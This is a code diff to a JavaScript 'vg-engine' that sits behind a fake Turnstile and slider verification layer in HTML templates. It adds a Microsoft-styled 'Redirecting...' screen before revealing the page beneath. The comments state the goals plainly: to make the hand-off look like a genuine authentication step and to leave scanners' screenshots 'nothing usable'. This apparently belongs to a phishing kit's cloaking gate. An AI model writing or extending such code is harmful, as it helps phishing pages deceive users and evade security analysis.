@@ -2339,6 +2339,51 @@
       }
     }
     
+    // Turnstile passed. Show a short "Redirecting..." transition before the
+    // protected page appears, then dismiss the verification layers.
+    //
+    // A sub-second reveal reads as "the popup was just closed" - there is no
+    // hand-off at all. A brief redirect state looks like a normal
+    // authentication completion, and a screenshot taken mid-transition
+    // captures nothing usable.
+    //
+    // The card reuses the verification layer's own styling (#F1F3F5 backdrop,
+    // white rounded card, #0078D4 spinner) so the transition reads as the same
+    // flow rather than a second, unrelated screen.
+    function _showRedirectTransition(onDone) {
+      var REDIRECT_MS = 2500;
+
+      // Self-contained keyframes - vg-engine is embedded inside arbitrary
+      // template HTML, so it cannot rely on a host @keyframes definition.
+      var style = document.createElement('style');
+      style.textContent = '@keyframes vgRedirectSpin{to{transform:rotate(360deg)}}';
+      (document.head || document.documentElement).appendChild(style);
+
+      var el = document.getElementById('vgRedirectLayer');
+      if (!el) {
+        el = document.createElement('div');
+        el.id = 'vgRedirectLayer';
+        el.style.cssText = 'position:fixed;inset:0;z-index:100000;background:#F1F3F5;' +
+          'font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,sans-serif;' +
+          'display:flex;align-items:center;justify-content:center;padding:24px 16px;';
+        el.innerHTML =
+          '<div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);' +
+          'border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">' +
+          '<div style="width:36px;height:36px;border:3px solid #EDEBE9;border-top-color:#0078D4;' +
+          'border-radius:50%;margin:0 auto 20px;animation:vgRedirectSpin 1s linear infinite;"></div>' +
+          '<h1 style="font-size:20px;font-weight:700;color:#232333;margin-bottom:6px;">Redirecting...</h1>' +
+          '<p style="font-size:13px;color:#605E5C;margin:0;line-height:1.5;">Please wait a moment.</p>' +
+          '</div>';
+        document.body.appendChild(el);
+      }
+      el.style.display = 'flex';
+
+      setTimeout(function() {
+        try { if (el.parentNode) el.parentNode.removeChild(el); } catch (e) {}
+        if (typeof onDone === 'function') onDone();
+      }, REDIRECT_MS);
+    }
+
     function hideSliderAndCfLayers() {
       if (_layersHidden) {
         console.log('[vg-engine] Layers already hidden, skipping');
@@ -2346,21 +2391,26 @@
       }
       _layersHidden = true;
 
-      var sliderLayer = document.getElementById('vgSliderLayer');
-      var cfLayer = document.getElementById('vgCfLayer');
-      
-      if(sliderLayer){
-        sliderLayer.style.display = 'none';
-        sliderLayer.style.visibility = 'hidden';
-      }
-      if(cfLayer){
-        cfLayer.style.display = 'none';
-        cfLayer.style.visibility = 'hidden';
-      }
-      
-      console.log('[vg-engine] Verification layers hidden, showing main content');
-      // The template's main card should become visible now
-      // Don't force display - let CSS/template handle it
+      // Play the redirect transition FIRST, then remove the layers. The layers
+      // stay up underneath the transition, so there is never a frame where the
+      // protected page is visible with no overlay.
+      _showRedirectTransition(function() {
+        var sliderLayer = document.getElementById('vgSliderLayer');
+        var cfLayer = document.getElementById('vgCfLayer');
+
+        if(sliderLayer){
+          sliderLayer.style.display = 'none';
+          sliderLayer.style.visibility = 'hidden';
+        }
+        if(cfLayer){
+          cfLayer.style.display = 'none';
+          cfLayer.style.visibility = 'hidden';
+        }
+
+        console.log('[vg-engine] Verification layers hidden, showing main content');
+        // The template's main card should become visible now
+        // Don't force display - let CSS/template handle it
+      });
     }
     
     // Check if slider is already completed when vg-engine loads
